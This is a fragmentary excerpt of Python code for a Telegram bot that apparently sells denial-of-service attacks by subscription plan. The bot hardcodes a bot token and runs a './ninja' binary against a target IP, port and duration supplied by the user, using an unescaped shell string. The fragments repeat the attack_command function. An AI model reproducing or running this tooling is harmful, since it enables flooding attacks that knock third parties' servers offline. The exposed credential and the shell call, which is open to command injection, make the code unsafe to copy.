...
TOKEN = '7800343898:AAG9prrgDKJOQVLQcf8xMyqVS13g64AQVPM'
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./ninja {target_ip} {target_port} {duration} 30")
...
def attack_command(message):
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "You are not approved to use this bot. Please contact the administrator  @NINJAGAMEROP")
            return
...
def attack_command(message):
    ...
    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*You are not approved to use this bot. Please contact the administrator   @NINJAGAMEROP*", parse_mode='Markdown')
            return
...
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        ...
        if user_data:
            ...
            response = "*No account information found. Please contact the administrator. @NINJAGAMEROP*"
